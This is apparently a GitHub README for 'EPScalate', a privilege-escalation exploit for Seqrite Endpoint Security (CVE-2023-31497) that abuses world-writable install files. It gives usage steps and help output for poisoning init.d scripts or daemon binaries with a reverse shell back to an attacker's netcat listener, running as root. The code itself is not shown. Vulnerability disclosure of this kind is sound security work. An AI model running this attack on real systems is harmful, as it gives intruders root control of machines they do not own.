# EPScalate

An elevation of privilege vulnerability in QuickHeal's Seqrite Enterprise Endpoint Security Solution (EPS). The vulnerability has been assigned a CVE ID of CVE-2023-31497.

poc.mp4

### Vendor and Product Details

* **Vendor**: Quick Heal Technologies Limited
* **Product**: Seqrite Endpoint Security (EPS)
* **Product Homepage**: <https://www.seqrite.com/endpoint-security/seqrite-endpoint-security>
* **Affected Versions**: Affects all versions prior to v8.0.

### Vulnerability Details

Seqrite endpoint security with its default installation installs to `/usr/lib/Seqrite/` with very weak directory and file permissions granting a local user full read/write permission to the contents of the directory. In addition, the installation procedure installs its startup scripts to `/etc/init.d/` which are world writable. This enables any low-privilege user on the system to escalate privileges to root.

The exploit makes use of 2 different vulnerabilities introduced by the software to elevate privileges on the system. Firstly, the fact that the application uses scripts in `/etc/init.d/` to start its scan processes which can be written to by any user. Secondly, the application makes use shared objects to dynamically load position-independent code (PIC) during runtime. As a matter of fact, all of the executable shared object files are world writable. Lastly, the application binaries used for the daemon process are world writable which basically means any non-privileged user could overwrite the scanner binaries with a reverse shell binary to execute arbitrary code as `root`.

### Exploit Usage

The exploit is a simple Python file that aids in the exploitation of the vulnerability.

Steps:

1. On the attacker machine, start a listener using netcat (`nc -lvp <port>`) or metasploit (`multi/handler`).
2. Copy/download the `epscalate.py` and `shellcode.c` file onto the target system.
3. Run the python file with proper arguments (`python3 epscalate.py -H 192.168.0.103:9999 -I`).
4. Wait for the AV to reload / the system to reboot.
5. The reverse connection to your listener can confirm code execution as root.

Exploit help:

```
$ python epscalate.py -h

                ~ 0xInfection

usage: epscalate.py -H <host>:<port> <technique_flag>

options:
  -h, --help            show this help message and exit
  -H HOSTPORT, --hostport HOSTPORT
                        The IP and port of the listening attacker machine in format of <ip>:<port>
  -B, --daemon-binaries
                        Overwrite the main daemon binaries to escalate privileges.
  -I, --initd-scripts   Posion /etc/init.d/ bash startup scripts with a reverse shell to escalate privileges.
```
